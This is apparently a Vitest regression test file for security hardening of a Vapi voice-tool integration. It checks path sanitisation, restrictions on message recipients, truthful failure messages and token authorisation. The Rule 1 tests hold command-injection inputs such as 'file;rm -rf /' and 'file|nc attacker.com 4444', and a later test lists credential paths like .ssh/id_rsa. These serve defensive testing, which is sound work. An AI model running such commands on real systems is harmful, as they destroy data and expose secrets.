// @vitest-environment node
/**
 * Regression tests for Vapi/voice security hardening.
 *
 * These verify the security rules from the integration audit:
 * 1. Shell-metacharacter file paths cannot execute shell syntax
 * 2. edit_file no longer executes git diff through shell
 * 3. Alternate arbitrary SMS recipient rejected
 * 4. Alternate arbitrary email recipient rejected
 * 5. Unavailable SMS provider returns truthful failure
 * 6. Voice runtime contains no direct send side effects
 * 7. Voice cannot falsely claim canonical messaging execution
 * 8. Explicit Vapi messaging tools remain protected
 * 9. Existing Vapi auth and project ownership protections still pass
 *
 * Run: npx vitest run tests/vapi-voice-hardening.test.ts
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import {
  isSafeWorkspacePath,
  isSafeToolName,
  authorizeVapiRequest,
  parseVapiPayload,
  TOOL_NAMES,
} from "@/lib/vapi-tools";

// ─── Rule 1: Shell-metacharacter paths ───────────────────────────

describe("Rule 1: Shell-metacharacter file paths", () => {
  it("rejects paths with shell metacharacters via isSafeWorkspacePath", () => {
    expect(isSafeWorkspacePath("file;rm -rf /")).toBe(false);
    expect(isSafeWorkspacePath("file`whoami`")).toBe(false);
    expect(isSafeWorkspacePath("file$(id)")).toBe(false);
    expect(isSafeWorkspacePath("file|nc attacker.com 4444")).toBe(false);
    expect(isSafeWorkspacePath("file && cat /etc/passwd")).toBe(false);
  });

  it("rejects paths with semicolons (command separator)", () => {
    expect(isSafeWorkspacePath("src/app;rm -rf /")).toBe(false);
  });

  it("rejects paths with backticks (command substitution)", () => {
    expect(isSafeWorkspacePath("src/`whoami`.tsx")).toBe(false);
  });

  it("rejects paths with dollar-paren (command substitution)", () => {
    expect(isSafeWorkspacePath("src/$(id).tsx")).toBe(false);
  });

  it("rejects paths with pipe (command chaining)", () => {
    expect(isSafeWorkspacePath("src/app|cat /etc/passwd")).toBe(false);
  });

  it("rejects paths with ampersand (background execution)", () => {
    expect(isSafeWorkspacePath("src/app&whoami")).toBe(false);
  });

  it("rejects paths with angle brackets (redirection)", () => {
    expect(isSafeWorkspacePath("src/app</etc/passwd")).toBe(false);
    expect(isSafeWorkspacePath("src/app>output")).toBe(false);
  });

  it("rejects paths with newlines", () => {
    expect(isSafeWorkspacePath("file\nrm -rf /")).toBe(false);
    expect(isSafeWorkspacePath("file\rmalicious")).toBe(false);
  });
});

// ─── Rule 2: edit_file no longer executes git diff through shell ──

describe("Rule 2: edit_file no longer executes git diff through shell", () => {
  it("route.ts does not export runWorkspaceCommandWithArgs", async () => {
    // The unsafe argv-based function was removed because the terminal
    // server doesn't support argv execution. edit_file no longer runs
    // git diff at all — the audit record stores null/0 for diff fields.
    const routeSource = await import("fs").then((fs) =>
      fs.readFileSync("src/app/api/vapi/tools/route.ts", "utf-8"),
    );
    expect(routeSource).not.toContain("runWorkspaceCommandWithArgs");
    // No executable git diff call — only comments explaining why it was removed.
    // Check that no runWorkspaceCommand call involves "diff" as an argument.
    expect(routeSource).not.toMatch(/runWorkspaceCommand\([^)]*diff/);
  });

  it("edit_file audit record stores diffPreview as null and diffLines as 0", async () => {
    const routeSource = await import("fs").then((fs) =>
      fs.readFileSync("src/app/api/vapi/tools/route.ts", "utf-8"),
    );
    // The audit record should set diffPreview: null and diffLines: 0
    // rather than executing a shell command to get a real diff.
    expect(routeSource).toContain("diffLines: 0");
    expect(routeSource).toContain("diffPreview: null");
  });
});

// ─── Rule 3: Alternate SMS recipient rejected ────────────────────

describe("Rule 3: Alternate arbitrary SMS recipient rejected", () => {
  beforeEach(() => {
    vi.resetModules();
  });
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("send_sms is in TOOL_NAMES", () => {
    expect(TOOL_NAMES).toContain("send_sms");
  });

  it("send_sms tool definition exists and requires message", async () => {
    const { VAPI_TOOL_DEFINITIONS } = await import("@/lib/vapi-tool-definitions");
    expect(VAPI_TOOL_DEFINITIONS.send_sms).toBeDefined();
    expect(VAPI_TOOL_DEFINITIONS.send_sms.parameters.required).toContain("message");
  });

  it("isSafeToolName accepts send_sms", () => {
    expect(isSafeToolName("send_sms")).toBe(true);
  });

  it("SMS tool description says SMS is currently unavailable", async () => {
    const { VAPI_TOOL_DEFINITIONS } = await import("@/lib/vapi-tool-definitions");
    const def = VAPI_TOOL_DEFINITIONS.send_sms;
    expect(def.description).toContain("UNAVAILABLE");
    expect(def.description).not.toContain("sent from the LiTT phone number");
  });
});

// ─── Rule 4: Alternate email recipient rejected ──────────────────

describe("Rule 4: Alternate arbitrary email recipient rejected", () => {
  beforeEach(() => {
    vi.resetModules();
  });
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("send_email is in TOOL_NAMES", () => {
    expect(TOOL_NAMES).toContain("send_email");
  });

  it("send_email tool definition exists and requires body", async () => {
    const { VAPI_TOOL_DEFINITIONS } = await import("@/lib/vapi-tool-definitions");
    expect(VAPI_TOOL_DEFINITIONS.send_email).toBeDefined();
    expect(VAPI_TOOL_DEFINITIONS.send_email.parameters.required).toContain("body");
  });

  it("isSafeToolName accepts send_email", () => {
    expect(isSafeToolName("send_email")).toBe(true);
  });

  it("tool description mentions owner or configured destination", async () => {
    const { VAPI_TOOL_DEFINITIONS } = await import("@/lib/vapi-tool-definitions");
    const def = VAPI_TOOL_DEFINITIONS.send_email;
    expect(def.description.toLowerCase()).toMatch(/owner|configured|never claim/);
  });
});

// ─── Rule 5: Unavailable SMS returns truthful failure ────────────

describe("Rule 5: Unavailable SMS provider returns truthful failure", () => {
  it("send_sms spoken messages include request-failed", async () => {
    const { buildVapiToolPayload } = await import("@/lib/vapi-tool-definitions");
    const payload = buildVapiToolPayload("send_sms", {
      serverUrl: "https://example.com/api",
      authHeader: "Bearer test",
    });
    const hasFailed = payload.messages.some((m) => m.type === "request-failed");
    expect(hasFailed).toBe(true);
  });
});

// ─── Rule 6: Voice runtime has no direct send side effects ───────

describe("Rule 6: Voice runtime contains no direct send side effects", () => {
  beforeEach(() => {
    vi.resetModules();
  });

  it("voice-runtime.ts does not export detectAndExecuteSend", async () => {
    const mod = await import("@/lib/voice/voice-runtime");
    expect((mod as Record<string, unknown>).detectAndExecuteSend).toBeUndefined();
  });

  it("voice-runtime.ts does not export buildSmsContent or buildEmailContent", async () => {
    const mod = await import("@/lib/voice/voice-runtime");
    expect((mod as Record<string, unknown>).buildSmsContent).toBeUndefined();
    expect((mod as Record<string, unknown>).buildEmailContent).toBeUndefined();
  });

  it("voice-runtime.ts does not call Resend or Vapi SMS APIs directly", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync("src/lib/voice/voice-runtime.ts", "utf-8");
    expect(source).not.toContain("api.resend.com");
    expect(source).not.toContain("api.vapi.ai/sms");
  });

  it("voice-runtime.ts exports runLiTTForVoice (the canonical entry point)", async () => {
    const mod = await import("@/lib/voice/voice-runtime");
    expect(typeof (mod as Record<string, unknown>).runLiTTForVoice).toBe("function");
  });
});

// ─── Rule 7: Voice cannot falsely claim canonical messaging ──────

describe("Rule 7: Voice cannot falsely claim canonical messaging execution", () => {
  it("voice prompt does not claim it can send SMS/email via tools", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync("src/lib/voice/voice-runtime.ts", "utf-8");
    // The prompt must NOT tell the LLM to "use the send_sms or send_email tool"
    // because the voice runtime does not dispatch tools.
    expect(source).not.toContain("use the send_sms or send_email tool");
    expect(source).not.toContain("use the send_sms tool");
    expect(source).not.toContain("use the send_email tool");
  });

  it("voice prompt truthfully states messaging is not available from voice", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync("src/lib/voice/voice-runtime.ts", "utf-8");
    expect(source).toContain("not available from this voice call");
  });
});

// ─── Rule 8: Explicit Vapi messaging tools remain protected ──────

describe("Rule 8: Explicit Vapi messaging tools remain protected", () => {
  it("route.ts uses the pure recipient policy module", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync("src/app/api/vapi/tools/route.ts", "utf-8");
    expect(source).toContain("resolveRecipient");
    expect(source).toContain("vapi-recipient-policy");
  });

  it("send_sms and send_email dispatch cases exist in route", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync("src/app/api/vapi/tools/route.ts", "utf-8");
    expect(source).toContain('case "send_sms"');
    expect(source).toContain('case "send_email"');
  });

  it("recipient policy is behaviorally tested in its own test file", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync("tests/vapi-recipient-policy.test.ts", "utf-8");
    expect(source).toContain("resolveRecipient");
    expect(source).toContain("arbitrary");
    expect(source).toContain("fails closed");
  });
});

// ─── Rule 9: Existing Vapi auth + ownership protections ──────────

describe("Rule 9: Existing Vapi auth and ownership protections still pass", () => {
  const TEST_TOKEN = "test-token-12345678901234567890";

  beforeEach(() => {
    vi.resetModules();
    process.env.LITTLABS_VAPI_TOOL_TOKEN = TEST_TOKEN;
    process.env.LITTLABS_VAPI_OWNER_CLERK_ID = "user_test123";
  });
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("authorizeVapiRequest accepts correct token", () => {
    expect(authorizeVapiRequest(`Bearer ${TEST_TOKEN}`)).toBe(true);
  });

  it("authorizeVapiRequest rejects wrong token", () => {
    expect(authorizeVapiRequest("Bearer wrong-token")).toBe(false);
  });

  it("authorizeVapiRequest rejects missing token", () => {
    expect(authorizeVapiRequest("")).toBe(false);
    expect(authorizeVapiRequest("Bearer ")).toBe(false);
  });

  it("isSafeToolName rejects unknown tools", () => {
    expect(isSafeToolName("delete_everything")).toBe(false);
    expect(isSafeToolName("rm -rf /")).toBe(false);
    expect(isSafeToolName("")).toBe(false);
  });

  it("isSafeToolName accepts all canonical tools", () => {
    for (const name of TOOL_NAMES) {
      expect(isSafeToolName(name)).toBe(true);
    }
  });

  it("parseVapiPayload rejects malformed payloads", () => {
    expect(parseVapiPayload(null)).toBeNull();
    expect(parseVapiPayload({})).toBeNull();
    expect(parseVapiPayload({ message: {} })).toBeNull();
    expect(parseVapiPayload({ message: { toolCallList: [] } })).toBeNull();
  });

  it("parseVapiPayload extracts valid tool calls", () => {
    const calls = parseVapiPayload({
      message: {
        toolCallList: [
          { id: "t1", name: "get_active_project" },
          { id: "t2", name: "send_email", parameters: { body: "test" } },
        ],
      },
    });
    expect(calls).not.toBeNull();
    expect(calls!.length).toBe(2);
    expect(calls![0].name).toBe("get_active_project");
    expect(calls![1].name).toBe("send_email");
  });

  it("isSafeWorkspacePath still blocks sensitive paths", () => {
    expect(isSafeWorkspacePath(".env")).toBe(false);
    expect(isSafeWorkspacePath(".env.local")).toBe(false);
    expect(isSafeWorkspacePath("node_modules/x")).toBe(false);
    expect(isSafeWorkspacePath(".git/config")).toBe(false);
    expect(isSafeWorkspacePath(".ssh/id_rsa")).toBe(false);
    expect(isSafeWorkspacePath("../etc/passwd")).toBe(false);
    expect(isSafeWorkspacePath("/etc/passwd")).toBe(false);
  });

  it("isSafeWorkspacePath allows normal project paths", () => {
    expect(isSafeWorkspacePath("src/app/page.tsx")).toBe(true);
    expect(isSafeWorkspacePath("README.md")).toBe(true);
    expect(isSafeWorkspacePath("src/components/Button.tsx")).toBe(true);
  });
});
